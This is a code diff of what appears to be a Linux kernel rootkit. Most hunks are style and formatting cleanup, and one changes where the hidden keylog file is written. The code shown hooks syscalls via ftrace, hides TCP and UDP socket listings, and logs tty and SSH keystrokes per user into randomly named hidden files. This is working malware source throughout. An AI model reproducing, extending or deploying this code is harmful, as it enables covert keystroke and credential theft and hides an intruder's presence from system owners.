@@ -814,10 +814,11 @@ static void __attribute__((unused)) _tty_dump(uid_t uid, pid_t pid, char *buf,
 	prinfo("%s\n", buf);
 }
 
-void _keylog_cleanup(void) {
-    kv_tty_close(&tty_sys_ctx);
-    memset(&tty_sys_ctx, 0, sizeof(struct tty_ctx));
-    fs_file_rm(sys_get_ttyfile());
+void _keylog_cleanup(void)
+{
+	kv_tty_close(&tty_sys_ctx);
+	memset(&tty_sys_ctx, 0, sizeof(struct tty_ctx));
+	fs_file_rm(sys_get_ttyfile());
 }
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5, 12, 0)
@@ -890,7 +891,7 @@ static ssize_t m_tty_read(struct kiocb *iocb, struct iov_iter *to)
 			ttybuf[strcspn(ttybuf, "\r")] = '\0';
 			kv_tty_write(&tty_sys_ctx, uid, ttybuf, sizeof(ttybuf));
 		} else if (app_flag & APP_SSH &&
-			(rv == 1 || flags & R_RETURN || flags & R_NEWLINE)) {
+			   (rv == 1 || flags & R_RETURN || flags & R_NEWLINE)) {
 			kv_key_update(&tty_sys_ctx, uid, byte, flags);
 		}
 	}
@@ -1022,8 +1023,8 @@ static unsigned long _load_syscall_variant(struct kernel_syscalls *ks,
 	rv = ks->k_kallsyms_lookup_name(str);
 	if (rv) {
 		struct sys_addr_list *sl;
-		sl = kcalloc(1, sizeof(struct sys_addr_list) , GFP_KERNEL);
-		if(sl) {
+		sl = kcalloc(1, sizeof(struct sys_addr_list), GFP_KERNEL);
+		if (sl) {
 			sl->addr = rv;
 			prinfo("add sysaddr: %lx\n", sl->addr);
 			list_add_tail(&sl->list, &sys_addr);
@@ -1157,11 +1158,11 @@ struct kernel_syscalls *kv_kall_load_addr(void)
 }
 
 static struct ftrace_hook ft_hooks[] = {
-	{_sys_arch("sys_exit_group"), m_exit_group, &real_m_exit_group, true},
-	{_sys_arch("sys_clone"), m_clone, &real_m_clone, true},
-	{_sys_arch("sys_kill"), m_kill, &real_m_kill, true},
-	{_sys_arch("sys_read"), m_read, &real_m_read, true},
-	{_sys_arch("sys_bpf"), m_bpf, &real_m_bpf, true},
+	{ _sys_arch("sys_exit_group"), m_exit_group, &real_m_exit_group, true },
+	{ _sys_arch("sys_clone"), m_clone, &real_m_clone, true },
+	{ _sys_arch("sys_kill"), m_kill, &real_m_kill, true },
+	{ _sys_arch("sys_read"), m_read, &real_m_read, true },
+	{ _sys_arch("sys_bpf"), m_bpf, &real_m_bpf, true },
 	{ "tcp4_seq_show", m_tcp4_seq_show, &real_m_tcp4_seq_show },
 	{ "udp4_seq_show", m_udp4_seq_show, &real_m_udp4_seq_show },
 	{ "tcp6_seq_show", m_tcp6_seq_show, &real_m_tcp6_seq_show },
@@ -1259,34 +1260,34 @@ struct sysfiles_t {
 	char sslfile[PATH_MAX];
 };
 static struct sysfiles_t sysfiles;
-static bool _sys_file_init(void) {
+static bool _sys_file_init(void)
+{
+	bool rc = false;
+	char *tty, *ssl;
+	size_t min = 16, max = 64, len = 0;
+	u8 rnd = 0;
 
-    bool rc = false;
-    char *tty, *ssl;
-    size_t min = 16, max = 64, len = 0;
-    u8 rnd = 0;
+	get_random_bytes(&rnd, sizeof(rnd));
+	len = min + (rnd % (max - min + 1));
+	tty = kv_util_random_AZ_string(len);
 
-    get_random_bytes(&rnd, sizeof(rnd));
-    len = min + (rnd % (max - min + 1));
-    tty = kv_util_random_AZ_string(len);
+	/** repeat */
+	get_random_bytes(&rnd, sizeof(rnd));
+	len = min + (rnd % (max - min + 1));
+	ssl = kv_util_random_AZ_string(len);
 
-    /** repeat */
-    get_random_bytes(&rnd, sizeof(rnd));
-    len = min + (rnd % (max - min + 1));
-    ssl = kv_util_random_AZ_string(len);
+	if (tty && ssl) {
+		snprintf(sysfiles.ttyfile, sizeof(sysfiles.ttyfile) - 1,
+			 "/tmp/.%s", tty);
 
-    if (tty && ssl) {
-        snprintf(sysfiles.ttyfile,
-                sizeof(sysfiles.ttyfile)-1, "/var/.%s", tty);
+		snprintf(sysfiles.sslfile, sizeof(sysfiles.sslfile) - 1,
+			 "/tmp/.%s", ssl);
+		kv_mem_free(&tty, &ssl);
 
-        snprintf(sysfiles.sslfile,
-                sizeof(sysfiles.sslfile)-1, "/tmp/.%s", ssl);
-        kv_mem_free(&tty, &ssl);
+		rc = true;
+	}
 
-        rc = true;
-    }
-
-    return rc;
+	return rc;
 }
 
 char *sys_get_ttyfile(void)
@@ -1322,7 +1323,8 @@ bool sys_init(void)
 				       ft_hooks[idx].name);
 
 			/** Init tty log */
-			tty_sys_ctx = kv_tty_open(&tty_sys_ctx, sys_get_ttyfile());
+			tty_sys_ctx =
+				kv_tty_open(&tty_sys_ctx, sys_get_ttyfile());
 			if (!tty_sys_ctx.fp) {
 				prerr("sys_init: Failed loading tty file\n");
 				rc = false;
